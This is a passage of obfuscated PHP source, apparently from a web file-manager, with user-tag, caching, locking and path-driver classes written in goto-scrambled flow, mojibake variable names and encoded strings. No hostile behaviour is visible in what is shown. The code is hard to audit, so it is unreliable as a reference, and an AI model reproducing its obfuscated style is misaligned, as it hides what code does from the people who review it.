<?php
 goto B‘«¢µã¢; EŠï„‡‰Úà: function binCheckBigger($f¦Âƒ«÷Ø, $cïçí‚Ø¿) { return $f¦Âƒ«÷Ø > $cïçí‚Ø¿; } $_SERVER[$_SERVER[åœÄéø][3]] = (base64_decode('OTI0MQ==').strrev('84'))+0;$_C8EV="eAzk8HeC9PGTbDG9nRVk7y45SxDb8CaW2XbFv5ENAnh7WdFFr6jcfIGcGwcZC2NRqma";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($e’ùÌŠ¥‹, $c»Ášù¾Í¦) { $b°õŒ»ˆÒ =& $_SERVER[›é¼±]; if (isset(self::$_methodList[$e’ùÌŠ¥‹])) { return @call_user_func_array(self::$_methodList[$e’ùÌŠ¥‹], $c»Ášù¾Í¦); } else { if (method_exists($this, $e’ùÌŠ¥‹)) { return call_user_func_array(array($this, $e’ùÌŠ¥‹), $c»Ášù¾Í¦); } else { think_exception(__CLASS__ . $b°õŒ»ˆÒ[4] . $e’ùÌŠ¥‹ . $b°õŒ»ˆÒ[5]); } } } public static function __callStatic($CÃ˜¼–ôˆ¡, $a†ñãÜª“¼) { if (isset(self::$_methodListStatic[$CÃ˜¼–ôˆ¡])) { return call_user_func_array(self::$_methodListStatic[$CÃ˜¼–ôˆ¡], $a†ñãÜª“¼); } else { if (method_exists(self, $CÃ˜¼–ôˆ¡)) { return call_user_func_array(array(self, $CÃ˜¼–ôˆ¡), $a†ñãÜª“¼); } else { show_json("{$CÃ˜¼–ôˆ¡}\50\51\40\156\157\164\x20\x65\x78\151\x73\164\73", !1); } } } public static function addMethod($cËÁ¤”…ƒ¡, $D¥¶á»ëÅ) { self::$_methodList[$cËÁ¤”…ƒ¡] = $D¥¶á»ëÅ; } public static function addMethodStatic($a¬ÍíÃÑï, $fÜ¹‚Ğš¼) { self::$_methodListStatic[$a¬ÍíÃÑï] = $fÜ¹‚Ğš¼; } } goto bŞ¸Ïä‹Üæ; dˆÉ…¹¥´Ø: class UserTagModel extends ModelBaseLight { public $optionType = "\x55\x73\x65\x72\56\164\x61\x67\x4c\x69\163\164"; public $modelType = "\125\163\145\162\x4f\x70\x74\151\157\x6e"; public $field = array("\156\x61\155\x65", "\x73\x74\x79\x6c\145", "\163\157\162\x74"); public function listData($A‰‘á¼¶Ì = false, $b­¾´”¾ = "\163\157\162\164", $a‡ç¯»Óö = false) { return parent::listData($A‰‘á¼¶Ì, $b­¾´”¾, $a‡ç¯»Óö); } public function remove($fø¸ƒÁÜéÚ) { return parent::remove($fø¸ƒÁÜéÚ); } public function add($B¹øê·Ÿ¬ƒ, $aŞîòâ‘ÑÂ = "\x6c\x61\142\145\154\55\x67\x72\145\x79\55\156\157\x72\155\141\154") { $eòêŸ‡ĞŸ« =& $_SERVER[›é¼±]; if ($this->findByName($B¹øê·Ÿ¬ƒ)) { return !1; } $C‹øÖ‘˜‘º = array($eòêŸ‡ĞŸ«[415] => $B¹øê·Ÿ¬ƒ, $eòêŸ‡ĞŸ«[478] => $aŞîòâ‘ÑÂ, $eòêŸ‡ĞŸ«[1737] => $this->getSort($eòêŸ‡ĞŸ«[256]) + 1); return parent::insert($C‹øÖ‘˜‘º); } public function update($bØƒ¤“¢Œƒ, $fê¨éç‚§®) { $EæªÅâÀ³ =& $_SERVER[›é¼±]; $EªãØñ‰ˆ = $this->listData($bØƒ¤“¢Œƒ); $eÖìñîÍç³ = $this->findByName($fê¨éç‚§®[$EæªÅâÀ³[28]]); if (!$EªãØñ‰ˆ || $eÖìñîÍç³ && $eÖìñîÍç³[$EæªÅâÀ³[395]] != $EªãØñ‰ˆ[$EæªÅâÀ³[395]]) { return !1; } return parent::update($bØƒ¤“¢Œƒ, $fê¨éç‚§®); } public function moveTop($cÉ¦•°áÚ) { $eÅ¤ËÁ‚‰ƒ =& $_SERVER[›é¼±]; $BõÔÖ¹°®™ = parent::listData(); $C÷ŸÛ• º— = $this->getSort($eÅ¤ËÁ‚‰ƒ[255]); foreach ($BõÔÖ¹°®™ as &$d÷ã•Ã¤¾¶) { if ($d÷ã•Ã¤¾¶[$eÅ¤ËÁ‚‰ƒ[395]] == $cÉ¦•°áÚ) { $d÷ã•Ã¤¾¶[$eÅ¤ËÁ‚‰ƒ[1756]] = $C÷ŸÛ• º—; continue; } $d÷ã•Ã¤¾¶[$eÅ¤ËÁ‚‰ƒ[1756]] += 1; } unset($d÷ã•Ã¤¾¶); return parent::resetData($BõÔÖ¹°®™); } public function moveBottom($D³Õ¸ßÈ¦í) { $fĞÛ‹á¥¹ =& $_SERVER[›é¼±]; $EÅŞ²ô÷à = $this->getSort($fĞÛ‹á¥¹[256]) + 1; return parent::update($D³Õ¸ßÈ¦í, array($fĞÛ‹á¥¹[1756] => $EÅŞ²ô÷à)); } public function resetSort($bîÉŠ«ĞÑ) { goto cÓëß¡ù¾Ô; D†•àèˆØê: for ($aÏªÇóŒ¡Ã = 0; $aÏªÇóŒ¡Ã < count($bîÉŠ«ĞÑ); $aÏªÇóŒ¡Ã++) { $D Œ­§âŠ [$bîÉŠ«ĞÑ[$aÏªÇóŒ¡Ã] . $AöÛ²õë¥[33]] = $aÏªÇóŒ¡Ã + 1; } $A™î„ˆÈ¶‘ = parent::listData(); foreach ($A™î„ˆÈ¶‘ as &$eØˆä†àî ) { $Eµ¨®çÈõö = $D Œ­§âŠ [$eØˆä†àî [$AöÛ²õë¥[395]]]; $eØˆä†àî [$AöÛ²õë¥[1756]] = $Eµ¨®çÈõö ? $Eµ¨®çÈõö : $eØˆä†àî [$AöÛ²õë¥[1756]]; } goto CÑ˜Éè©Ç–; CÑ˜Éè©Ç–: unset($eØˆä†àî ); return parent::resetData($A™î„ˆÈ¶‘); goto aØ“·‡Û; cÓëß¡ù¾Ô: $AöÛ²õë¥ =& $_SERVER[›é¼±]; $D Œ­§âŠ  = array(); $bîÉŠ«ĞÑ = is_array($bîÉŠ«ĞÑ) ? $bîÉŠ«ĞÑ : array(); goto D†•àèˆØê; aØ“·‡Û: } private function getSort($fà¾‘Š¤ï“) { $FŠ£æ×Ì  =& $_SERVER[›é¼±]; $c—½È¶Ï²¸ = parent::listData(); $cáË´Ê¨ÉÇ = array_to_keyvalue($c—½È¶Ï²¸, $FŠ£æ×Ì [33], $FŠ£æ×Ì [1756]); if (!$cáË´Ê¨ÉÇ) { $cáË´Ê¨ÉÇ = array(0); } $CÓÃ¢°¢æñ = $fà¾‘Š¤ï“ == $FŠ£æ×Ì [256] ? max($cáË´Ê¨ÉÇ) : min($cáË´Ê¨ÉÇ); return intval($CÓÃ¢°¢æñ); } } goto eÃ§·ßà÷†; Aø„Â¦ßÁ¸: class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto eõ¨¸’¸¹; eŸ««‡²å: $fè–Õ‹éïÎ = $GLOBALS[$B®÷ÉÒŸÌ[6]][$B®÷ÉÒŸÌ[347]]; $a©öŒçÜ± = $fè–Õ‹éïÎ[$fè–Õ‹éïÎ[$B®÷ÉÒŸÌ[829]]]; $AÂèÁÍï = $fè–Õ‹éïÎ[$B®÷ÉÒŸÌ[830]]; goto AàÑùê¯¥; AàÑùê¯¥: switch ($fè–Õ‹éïÎ[$B®÷ÉÒŸÌ[829]]) { case $B®÷ÉÒŸÌ[17]: self::$handle = Model($B®÷ÉÒŸÌ[831]); break; case $B®÷ÉÒŸÌ[832]: self::$handle = new CacheRedis($a©öŒçÜ±, $AÂèÁÍï); break; case $B®÷ÉÒŸÌ[833]: self::$handle = new CacheMemcached($a©öŒçÜ±, $AÂèÁÍï); break; case $B®÷ÉÒŸÌ[193]: self::$handle = new CacheFile($a©öŒçÜ±, $AÂèÁÍï); break; default: break; } return self::$handle; goto AŒ˜›‚Ñ; eõ¨¸’¸¹: $B®÷ÉÒŸÌ =& $_SERVER[›é¼±]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto eŸ««‡²å; AŒ˜›‚Ñ: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($DÅºÃ•İ‚) { if (is_array($DÅºÃ•İ‚) || is_object($DÅºÃ•İ‚)) { $DÅºÃ•İ‚ = json_encode($DÅºÃ•İ‚); } $DÅºÃ•İ‚ = rawurlencode($DÅºÃ•İ‚); return md5(KOD_SITE_ID . $_SERVER[›é¼±][71] . $DÅºÃ•İ‚); } public static function get($Eñ¼­Ô“‚¹, $c‚ÈËÏ‡× = false) { $D†Ó°ƒª²± = self::key($Eñ¼­Ô“‚¹); if ($c‚ÈËÏ‡×) { return unserialize(self::init()->get($D†Ó°ƒª²±)); } if (!isset(self::$memoryCache[$D†Ó°ƒª²±])) { $Aè•ØØÊØ = self::init()->get($D†Ó°ƒª²±); self::$memoryCache[$D†Ó°ƒª²±] = unserialize($Aè•ØØÊØ); } return self::$memoryCache[$D†Ó°ƒª²±]; } public static function set($dõ×ì ®½, $Eö¥‰×š, $Få†Æ‡Ô = false) { goto f¦Î«øĞŞ«; D…ƒÍ•ÉÅ²: CacheLock::unlock($dõ×ì ®½); return $a’š˜÷¡²Ô; goto d¥¿‚÷“ĞÉ; DîçÃ•¤áÓ: CacheLock::lock($dõ×ì ®½); $a’š˜÷¡²Ô = self::init()->set($aÏ³ßÕùÈƒ, serialize($Eö¥‰×š), $Få†Æ‡Ô); self::$memoryCache[$aÏ³ßÕùÈƒ] = $Eö¥‰×š; goto D…ƒÍ•ÉÅ²; f¦Î«øĞŞ«: $aÏ³ßÕùÈƒ = self::key($dõ×ì ®½); if (isset(self::$memoryCache[$aÏ³ßÕùÈƒ]) && self::$memoryCache[$aÏ³ßÕùÈƒ] === $Eö¥‰×š) { return !0; } if ($Få†Æ‡Ô === 0) { self::$memoryCache[$aÏ³ßÕùÈƒ] = $Eö¥‰×š; return !0; } goto DîçÃ•¤áÓ; d¥¿‚÷“ĞÉ: } public static function getCall($D‡Šå«áÂÅ, $EàáĞÌàŠä, $bŒ†òŒÓ…İ, $bÈìõöÍƒŸ = array()) { goto A‚º‚‘Éô; fæáò½ªæ¿: $EíÕ’„Ö = call_user_func_array($bŒ†òŒÓ…İ, $bÈìõöÍƒŸ); $EíÕ’„Ö = $EíÕ’„Ö ? $EíÕ’„Ö : $F’‘¡–¤š[33]; self::set($D‡Šå«áÂÅ, $EíÕ’„Ö, $EàáĞÌàŠä); goto D—…¹Òó½¤; D—…¹Òó½¤: return $EíÕ’„Ö; goto bÍ¯‡Å“è; A‚º‚‘Éô: $F’‘¡–¤š =& $_SERVER[›é¼±]; $EíÕ’„Ö = self::get($D‡Šå«áÂÅ); if ($EíÕ’„Ö || $EíÕ’„Ö === $F’‘¡–¤š[33]) { return $EíÕ’„Ö; } goto fæáò½ªæ¿; bÍ¯‡Å“è: } public static function remove($Cîç†áå·‘) { goto F‡³‚‘¡ìÁ; FÊ–öñôñ: CacheLock::lock($Cîç†áå·‘); $DÕ„©ƒæ² = self::init()->remove($C³óÕ¿¤„‡); CacheLock::unlock($Cîç†áå·‘); goto CîØŒÑÃ; CîØŒÑÃ: return $DÕ„©ƒæ²; goto b´˜à§ÕÜ; F‡³‚‘¡ìÁ: $C³óÕ¿¤„‡ = self::key($Cîç†áå·‘); unset(self::$memoryCache[$C³óÕ¿¤„‡]); self::clearTimeout(); goto FÊ–öñôñ; b´˜à§ÕÜ: } public static function removeMemory($aîÁšÀ£à) { $b†‹˜¤·öò = self::key($aîÁšÀ£à); unset(self::$memoryCache[$b†‹˜¤·öò]); } public static function clearMemory($a¿Í†œÎ¹‡ = false) { if ($a¿Í†œÎ¹‡) { $a¿Í†œÎ¹‡ = self::key($a¿Í†œÎ¹‡); unset(self::$memoryCache[$a¿Í†œÎ¹‡]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[›é¼±][834])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[›é¼±][835])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($E®“îáì¦‰, $a÷„Ò¬´äÁ) { $fÕìºêæ’ğ =& $_SERVER[›é¼±]; $this->cachePath = $E®“îáì¦‰[$fÕìºêæ’ğ[76]]; $this->prefix = $fÕìºêæ’ğ[836]; $this->cacheTime = $a÷„Ò¬´äÁ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($a×Öè†‘) { $CïğŒ¥²–  =& $_SERVER[›é¼±]; $a×Öè†‘ = str_replace(array($CïğŒ¥²– [837], $CïğŒ¥²– [97], $CïğŒ¥²– [70]), $CïğŒ¥²– [838], $a×Öè†‘); return $this->cachePath . $CïğŒ¥²– [839] . $a×Öè†‘ . $CïğŒ¥²– [840]; } public function set($BÒø¸õÔ, $BóİÚÊ‘Ç, $b¨‚ß¡äøŞ = false) { $DöÍÄİğëê = $this->getFile($BÒø¸õÔ); if (file_put_contents($DöÍÄİğëê, $this->prefix . $BóİÚÊ‘Ç, LOCK_EX)) { @touch($DöÍÄİğëê, intval(time() + $b¨‚ß¡äøŞ)); clearstatcache(); return !0; } @unlink($DöÍÄİğëê); return !1; } public function get($d¹ˆ…Û„‰Ì) { $C‡¶‰º‘ = $this->getFile($d¹ˆ…Û„‰Ì); if (file_exists($C‡¶‰º‘) && filemtime($C‡¶‰º‘) < time()) { @unlink($C‡¶‰º‘); return !1; } $Eøø¨²›° = @file_get_contents($C‡¶‰º‘); return substr($Eøø¨²›°, strlen($this->prefix)); } public function remove($F¤º—Œßã) { $B‚‚”¢ÑÔ = $this->getFile($F¤º—Œßã); return @unlink($B‚‚”¢ÑÔ); } public function deleteAll() { $bñÚŒœˆ©ƒ =& $_SERVER[›é¼±]; $FòÕ¯öŸ¡ = scandir($this->cachePath); foreach ($FòÕ¯öŸ¡ as $CÀÅ‚È„Š‰) { $a¤…²Ô®¡ø = $this->cachePath . $CÀÅ‚È„Š‰; if (strpos($a¤…²Ô®¡ø, $bñÚŒœˆ©ƒ[840]) && strpos($a¤…²Ô®¡ø, $bñÚŒœˆ©ƒ[841])) { @unlink($a¤…²Ô®¡ø); } } } public function clearTimeout() { $B»¡Ò÷ŞŠÓ =& $_SERVER[›é¼±]; $AÇ‰æ£èÍ° = scandir($this->cachePath); foreach ($AÇ‰æ£èÍ° as $cÔÔé“Êˆô) { $F„„†¡†É = $this->cachePath . $cÔÔé“Êˆô; if (strpos($F„„†¡†É, $B»¡Ò÷ŞŠÓ[840]) && strpos($F„„†¡†É, $B»¡Ò÷ŞŠÓ[841]) && filemtime($F„„†¡†É) < time()) { @unlink($F„„†¡†É); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto C’ê•»–; d¸Ï¹ÁÇèŒ: self::$timeout = $bÔ‰ÆÎ±İ[$F’ÛğäÚ°ï[842]] ? $bÔ‰ÆÎ±İ[$F’ÛğäÚ°ï[842]] : 10; $D‰òÉçŸã = _get($GLOBALS[$F’ÛğäÚ°ï[6]], $F’ÛğäÚ°ï[843]); $bš¸¯ÇŞ÷ = $bÔ‰ÆÎ±İ[$F’ÛğäÚ°ï[829]] ? $bÔ‰ÆÎ±İ[$F’ÛğäÚ°ï[829]] : $F’ÛğäÚ°ï[193]; goto CÏéÕï—å; CÏéÕï—å: if ($bš¸¯ÇŞ÷ == $F’ÛğäÚ°ï[17] && $D‰òÉçŸã == $F’ÛğäÚ°ï[9]) { $bš¸¯ÇŞ÷ = $F’ÛğäÚ°ï[193]; } switch ($bš¸¯ÇŞ÷) { case $F’ÛğäÚ°ï[832]: self::$handle = new CacheLockRedis(); break; case $F’ÛğäÚ°ï[833]: self::$handle = new CacheLockMemcached(); break; case $F’ÛğäÚ°ï[17]: self::$handle = new CacheLockDatabase(); break; case $F’ÛğäÚ°ï[193]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto aæòäì”ßª; C’ê•»–: $F’ÛğäÚ°ï =& $_SERVER[›é¼±]; if (self::$handle) { return self::$handle; } $bÔ‰ÆÎ±İ = $GLOBALS[$F’ÛğäÚ°ï[6]][$F’ÛğäÚ°ï[347]]; goto d¸Ï¹ÁÇèŒ; aæòäì”ßª: } private static function key($dµ©ÜŠÍ) { return $_SERVER[›é¼±][844] . Cache::key($dµ©ÜŠÍ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($BÆâÒ×®Õ• = '') { self::$errorMsg = $BÆâÒ×®Õ•; } public static function lockGlobal($FµĞ¬ŸÒóÔ, $d˜÷ëÔ· Â) { return self::lock($FµĞ¬ŸÒóÔ, $d˜÷ëÔ· Â, !0); } public static function lock($dêóâĞ»Àã, $eÄ·ã‚†’Â = false, $E®‚èÀæª¬ = false) { goto BŠ¦ï×ğà; cËØ¢­Öî—: if (!$E®‚èÀæª¬) { self::$lockItem[$CŠ‰Ù„’¯Î] = !0; } return $CåÓ½±íÌ; goto e°‰ßÀÅŠ; eÑ¾šÑšÒ: $eÄ·ã‚†’Â = $eÄ·ã‚†’Â ? $eÄ·ã‚†’Â : self::$timeout; $CåÓ½±íÌ = $D¢ç‡¨Ë×->lock($CŠ‰Ù„’¯Î, $eÄ·ã‚†’Â); if (!$CåÓ½±íÌ) { $CÒ¢®”Ïˆ = "\x6c\x6f\x63\153\x20\145\162\162\x6f\162\73\153\x65\171\75{$dêóâĞ»Àã}\x3b\x74\151\x6d\145\75{$eÄ·ã‚†’Â}\x3b" . self::$errorMsg . $f¯İˆ¼ÙŒ[68] . get_caller_msg(); $EšƒÓëÀ¢– = LNG($f¯İˆ¼ÙŒ[845]) . "\x28{$eÄ·ã‚†’Â}\x73\x29\56" . LNG($f¯İˆ¼ÙŒ[846]); $EšƒÓëÀ¢– .= $f¯İˆ¼ÙŒ[847]; if (is_string(self::$errorMsg) && self::$errorMsg) { $EšƒÓëÀ¢– = $EšƒÓëÀ¢– . $f¯İˆ¼ÙŒ[848] . self::$errorMsg; } write_log($CÒ¢®”Ïˆ, $f¯İˆ¼ÙŒ[849]); show_json($EšƒÓëÀ¢–, !1); } goto cËØ¢­Öî—; BŠ¦ï×ğà: $f¯İˆ¼ÙŒ =& $_SERVER[›é¼±]; $D¢ç‡¨Ë× = self::init(); $CŠ‰Ù„’¯Î = self::key($dêóâĞ»Àã); goto eÑ¾šÑšÒ; e°‰ßÀÅŠ: } public static function lockGet($aÎ¢Å·˜ô÷) { $E¡®Ë×Ã©¸ = self::key($aÎ¢Å·˜ô÷); if (self::$lockItem[$E¡®Ë×Ã©¸]) { return self::$lockItem[$E¡®Ë×Ã©¸]; } return self::init()->lockGet($E¡®Ë×Ã©¸); } public static function unlock($e·ÆŸÈÕ•ø) { $fñ¨…³’§Û = self::key($e·ÆŸÈÕ•ø); self::$lockItem[$fñ¨…³’§Û] = null; return self::init()->unlock($fñ¨…³’§Û); } public static function unlockRuntime() { $DËÍ£Ïç¦ =& $_SERVER[›é¼±]; $Bµä­óØ = self::init(); $Aßôì½¯Ÿ” = !1; foreach (self::$lockItem as $döÖªßùù => $c„¦”Š·…±) { if (!$c„¦”Š·…±) { continue; } $Bµä­óØ->unlock($döÖªßùù); if (!$Aßôì½¯Ÿ”) { $Aßôì½¯Ÿ” = !0; write_log($DËÍ£Ïç¦[850] . $döÖªßùù . $DËÍ£Ïç¦[68] . get_caller_msg(), $DËÍ£Ïç¦[849]); continue; } write_log($DËÍ£Ïç¦[850] . $döÖªßùù, $DËÍ£Ïç¦[849]); } self::fileUnlockAll(); } public static function fileLock($c¿¢»Ä“ ³) { goto aŞÃ¶‰éœ; AƒÇøê÷„à: if (flock($D‰Œ—²°¨È, LOCK_EX)) { return !0; } self::unlock($c¿¢»Ä“ ³); show_json($CªõÅÍæ°[854], !1); goto e†õ™”Àğ‚; aŞÃ¶‰éœ: $CªõÅÍæ° =& $_SERVER[›é¼±]; if (!$GLOBALS[$CªõÅÍæ°[851]]) { $GLOBALS[$CªõÅÍæ°[851]] = array(); } $GLOBALS[$CªõÅÍæ°[851]][$c¿¢»Ä“ ³] = !1; goto BŸÙõ÷›ùˆ; BŸÙõ÷›ùˆ: $D‰Œ—²°¨È = fopen(DATA_PATH . $c¿¢»Ä“ ³ . $CªõÅÍæ°[852], $CªõÅÍæ°[853]); if (!$D‰Œ—²°¨È) { return !1; } $GLOBALS[$CªõÅÍæ°[851]][$c¿¢»Ä“ ³] = $D‰Œ—²°¨È; goto AƒÇøê÷„à; e†õ™”Àğ‚: return !1; goto b ‘¸ï«Ş; b ‘¸ï«Ş: } public static function fileUnlock($C×ƒ„„Ñ‰Ø) { $dÕÁ¢„†ƒ¡ =& $_SERVER[›é¼±]; $EÕ‹°Û„¬  = $GLOBALS[$dÕÁ¢„†ƒ¡[851]][$C×ƒ„„Ñ‰Ø]; if (!$EÕ‹°Û„¬ ) { return; } $GLOBALS[$dÕÁ¢„†ƒ¡[851]][$C×ƒ„„Ñ‰Ø] = !1; flock($EÕ‹°Û„¬ , LOCK_UN); fclose($EÕ‹°Û„¬ ); } public static function fileUnlockAll() { $cãø¬Ç¸µÎ =& $_SERVER[›é¼±]; if (!$GLOBALS[$cãø¬Ç¸µÎ[851]]) { return; } foreach ($GLOBALS[$cãø¬Ç¸µÎ[851]] as $E™¢½Éòğó => $eŞø›Ì©òÊ) { if (!$eŞø›Ì©òÊ) { continue; } $GLOBALS[$cãø¬Ç¸µÎ[851]][$E™¢½Éòğó] = !1; flock($eŞø›Ì©òÊ, LOCK_UN); fclose($eŞø›Ì©òÊ); } $GLOBALS[$cãø¬Ç¸µÎ[851]] = array(); } } goto b¡ù„ö®ùå; DŒÅ‰¥º¥•: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $Aß‘ì™ªˆê =& $_SERVER[›é¼±]; $this->objectDriver = array($Aß‘ì™ªˆê[57], $Aß‘ì™ªˆê[58], $Aß‘ì™ªˆê[59], $Aß‘ì™ªˆê[60], $Aß‘ì™ªˆê[61], $Aß‘ì™ªˆê[62], $Aß‘ì™ªˆê[63], $Aß‘ì™ªˆê[64], $Aß‘ì™ªˆê[65]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($Dœ Ó¯á¨) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($Dœ Ó¯á¨, $_SERVER[›é¼±][8]); } return $Dœ Ó¯á¨; } public function iconvApp($bƒíÓó¬±á) { return $bƒíÓó¬±á; } public function iconvSystem($fÇš¥Û³Œ—) { return $fÇš¥Û³Œ—; } public function iconvTo($fæ‘ˆ˜Ä›, $Aåğøä¨„Ú, $a¦àŸİÄ•ä) { goto fåÖÚÛÃ‹; C‘ø©Åí: $E‘ê´ÁµÙì = $E‘ê´ÁµÙì ? $E‘ê´ÁµÙì : $fæ‘ˆ˜Ä›; if (strstr($E‘ê´ÁµÙì, $BùŸ­íŠˆæ[70])) { $E‘ê´ÁµÙì = str_replace($BùŸ­íŠˆæ[70], $BùŸ­íŠˆæ[71], $E‘ê´ÁµÙì); } $eÎ§ïßÌí¬[$Aåğøä¨„Ú . $BùŸ­íŠˆæ[67] . $a¦àŸİÄ•ä . $BùŸ­íŠˆæ[68] . $fæ‘ˆ˜Ä›] = $E‘ê´ÁµÙì; goto côàô¤óøñ; côàô¤óøñ: $eÎ§ïßÌí¬[$a¦àŸİÄ•ä . $BùŸ­íŠˆæ[67] . $Aåğøä¨„Ú . $BùŸ­íŠˆæ[68] . $fæ‘ˆ˜Ä›] = $fæ‘ˆ˜Ä›; $eÎ§ïßÌí¬[$a¦àŸİÄ•ä . $BùŸ­íŠˆæ[67] . $Aåğøä¨„Ú . $BùŸ­íŠˆæ[68] . $E‘ê´ÁµÙì] = $fæ‘ˆ˜Ä›; $eÎ§ïßÌí¬[$Aåğøä¨„Ú . $BùŸ­íŠˆæ[67] . $a¦àŸİÄ•ä . $BùŸ­íŠˆæ[68] . $E‘ê´ÁµÙì] = $E‘ê´ÁµÙì; goto B‘Çë‡‘¿±; fåÖÚÛÃ‹: $BùŸ­íŠˆæ =& $_SERVER[›é¼±]; if (!$fæ‘ˆ˜Ä› || !function_exists($BùŸ­íŠˆæ[66])) { return $fæ‘ˆ˜Ä›; } static $eÎ§ïßÌí¬ = array(); goto C¸ã¼òÄØä; B‘Çë‡‘¿±: return $E‘ê´ÁµÙì; goto Aè®¤ùÅ; C¸ã¼òÄØä: $C˜ÑœÔ©Í¨ = $Aåğøä¨„Ú . $BùŸ­íŠˆæ[67] . $a¦àŸİÄ•ä . $BùŸ­íŠˆæ[68] . $fæ‘ˆ˜Ä›; if (isset($eÎ§ïßÌí¬[$C˜ÑœÔ©Í¨])) { return $eÎ§ïßÌí¬[$C˜ÑœÔ©Í¨]; } if (function_exists($BùŸ­íŠˆæ[69])) { $E‘ê´ÁµÙì = @mb_convert_encoding($fæ‘ˆ˜Ä›, $a¦àŸİÄ•ä, $Aåğøä¨„Ú); } else { $E‘ê´ÁµÙì = @iconv($Aåğøä¨„Ú, $a¦àŸİÄ•ä, $fæ‘ˆ˜Ä›); } goto C‘ø©Åí; Aè®¤ùÅ: } public function getPathInner($B§§ïœ¤¨) { $f‡˜…æó = IO::init($B§§ïœ¤¨); return $f‡˜…æó->path; } public function getPathOuter($a¿â‘”Ù·) { $F©Î“Ÿ÷²ˆ =& $_SERVER[›é¼±]; $B‘‘Ï¨Ûé× = strlen(trim($this->pathBase, $F©Î“Ÿ÷²ˆ[8])); $a¿â‘”Ù· = substr(trim($a¿â‘”Ù·, $F©Î“Ÿ÷²ˆ[8]), $B‘‘Ï¨Ûé×); return $this->pathDriver . $F©Î“Ÿ÷²ˆ[8] . ltrim($a¿â‘”Ù·, $F©Î“Ÿ÷²ˆ[8]); } public function isParentOf($CÓ”Ñ…ÅËÓ, $c†ÜàŞ…¹) { $eÏ·¬Ê–ë =& $_SERVER[›é¼±]; $CÓ”Ñ…ÅËÓ = rtrim(strtolower($CÓ”Ñ…ÅËÓ), $eÏ·¬Ê–ë[8]) . $eÏ·¬Ê–ë[8]; $c†ÜàŞ…¹ = rtrim(strtolower($c†ÜàŞ…¹), $eÏ·¬Ê–ë[8]) . $eÏ·¬Ê–ë[8]; $b˜ÛŸÑ˜ô‹ = strpos($c†ÜàŞ…¹, $CÓ”Ñ…ÅËÓ) === 0; return $b˜ÛŸÑ˜ô‹; } public function getType() { $b‚¤‰İ—÷È =& $_SERVER[›é¼±]; $AÚ•ŞˆÒç£ = str_replace($b‚¤‰İ—÷È[72], $b‚¤‰İ—÷È[33], get_class($this)); return strtolower($AÚ•ŞˆÒç£); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($fí¾ñù´¼À, $e»¤•“Ê³•) { $CÖ–òëó» =& $_SERVER[›é¼±]; $f²‰µÇÃ±ò = rtrim($fí¾ñù´¼À, $CÖ–òëó»[8]) . $CÖ–òëó»[8] . $e»¤•“Ê³•; $dÛœ§Á«…› = $this->exist($f²‰µÇÃ±ò); return $dÛœ§Á«…› ? $f²‰µÇÃ±ò : !1; } public function setModifyTime($BñŞ¢áëö, $FÒåİ¯Ü = '') { } public function renameObject($dÊæÑ¤Üêè, $C™…°ß–Á) { goto A¹ò•®°Ğ; B¤–Úº¾–Ï: return $cáÑ†¥ºê ? $C™…°ß–Á : !1; goto C¬»µïÔê; d‰ßÛÇ»¢÷: $dÊæÑ¤Üêè = $this->getPathOuter($dÊæÑ¤Üêè); $C™…°ß–Á = $this->pathFather($dÊæÑ¤Üêè) . $C™…°ß–Á; if (IO::isFile($dÊæÑ¤Üêè)) { $cáÑ†¥ºê = IO::copy($dÊæÑ¤Üêè, $this->pathFather($dÊæÑ¤Üêè), REPEAT_RENAME_FOLDER, $B·Ô“Šİëê); if ($cáÑ†¥ºê) { IO::remove($dÊæÑ¤Üêè); } } else { $cáÑ†¥ºê = IO::mkdir($C™…°ß–Á); if (!$cáÑ†¥ºê) { return !1; } $E«Ú§ƒĞØÆ = IO::listPath($dÊæÑ¤Üêè, !0); $b×ÑÛøİœ = array_merge($E«Ú§ƒĞØÆ[$f­Ê²ß³†[74]], $E«Ú§ƒĞØÆ[$f­Ê²ß³†[75]]); foreach ($b×ÑÛøİœ as $bÛ÷ãé…õ) { IO::move($bÛ÷ãé…õ[$f­Ê²ß³†[76]], $C™…°ß–Á, REPEAT_RENAME_FOLDER); } IO::remove($dÊæÑ¤Üêè); } goto B¤–Úº¾–Ï; A¹ò•®°Ğ: $f­Ê²ß³† =& $_SERVER[›é¼±]; $B·Ô“Šİëê = $C™…°ß–Á; Hook::trigger($f­Ê²ß³†[73], $this, $dÊæÑ¤Üêè, $this, $this->pathFather($dÊæÑ¤Üêè) . $C™…°ß–Á); goto d‰ßÛÇ»¢÷; C¬»µïÔê: } public function tempFile($fâÑ°“±¾ = '', $eéÖ¯¡ˆ„ = '') { goto bÁ½â¤„éÃ; bÁ½â¤„éÃ: if (!$fâÑ°“±¾) { $fâÑ°“±¾ = rand_string(15); } $Aæ¬Äˆ‹Åã = TEMP_FILES . rand_string(15) . $_SERVER[›é¼±][8]; @mkdir($Aæ¬Äˆ‹Åã, DEFAULT_PERRMISSIONS, !0); goto f‡µóÒ×Š; f‡µóÒ×Š: $Aó‚×Û³î = $Aæ¬Äˆ‹Åã . $fâÑ°“±¾; @touch($Aó‚×Û³î); if ($eéÖ¯¡ˆ„) { file_put_contents($Aó‚×Û³î, $eéÖ¯¡ˆ„); } goto a´•Šßƒùè; a´•Šßƒùè: return $Aó‚×Û³î; goto C­¶Ä’‡–»; C­¶Ä’‡–»: } public function tempFileRemve($dã¡“ÖÁ¥â) { @unlink($dã¡“ÖÁ¥â); 